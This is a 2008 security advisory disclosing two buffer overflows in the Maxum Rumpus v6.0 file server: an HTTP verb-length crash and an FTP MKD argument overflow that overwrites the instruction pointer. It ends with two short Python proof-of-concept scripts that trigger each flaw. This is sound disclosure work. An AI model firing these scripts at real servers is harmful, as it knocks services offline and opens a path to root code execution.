				<title>Two buffer overflow vulnerabilities in Rumpus</title>
				<description><![CDATA[ BLUE MOON SECURITY ADVISORY 2008-09
===================================


:Title: Two buffer overflows in Maxum Rumpus
:Severity: Critical
:Reporter: Blue Moon Consulting
:Products: Maxum Rumpus v6.0
:Fixed in: 6.0.1


Description
-----------

Rumpus turns any Mac into a file transfer server.

Rumpus v6.0 contains two buffer overflow vulnerabilities in its HTTP and FTP modules. The first allows an unauthenticated user to crash Rumpus. The later may result in arbitrary code execution under superuser privilege.

The overflow in HTTP component is caused by the lack of boundary check when parsing for HTTP action verb (GET, POST, PUT, etc.). If the verb is exactly 2908-byte long, the server runs into a segmentation fault and crashes. A manual restart is required. It has been observed that this problem occurs at other verb lengths too. The vulnerability is rated at moderate severity for the lost of service.

The overflow in FTP component is also caused by the lack of length check when parsing FTP commands that take argument such as ``MKD``, ``XMKD``, ``RMD`` and so on. The overflow occurs when the argument is ``strcpy`` to an internal buffer. This buffer is 1024-byte long. When the passed-in argument is longer than 1046 bytes, the instruction pointer will be overwritten. This allows a successful attack to run arbitrary code under the privilege of a superuser (root) by default. Though authorization is required to exploit this security bug, the vulnerability is rated at critical severity because the FTP daemon could be allowing anonymous access.

Workaround
----------

There is no workaround the first bug.

Disable ANONYMOUS and only allow trusted users to use FTP.

Fix
---

Maxum has released Rumpus v6.0.1 which addressed these bugs.

:Public disclosure: December 01, 2008

:Exploit code:

For the vulnerability in HTTP component::

  from socket import socket, AF_INET, SOCK_STREAM

  host = "192.168.1.12"
  port = 80

  s = socket(AF_INET, SOCK_STREAM)
  s.connect((host, port))
  s.send('z' * 2908 + '\n\n')
  s.recv(1024)
  s.close()

For the vulnerability in FTP component::

  from socket import socket, AF_INET, SOCK_STREAM
  
  host = "192.168.1.12"
  port = 21
  user = "regular"
  pass_ = "training"
  
  commands = [
  	'user regular\n',
  	'pass training\n',
  	'mkd ' + 'z' * 1046 + 'abcd\n'
  ]
  
  s = socket(AF_INET, SOCK_STREAM)
  s.connect((host, port))
  s.recv(1024)
  for line in commands:
  	s.send(line)
  	s.recv(1024)
  s.close()
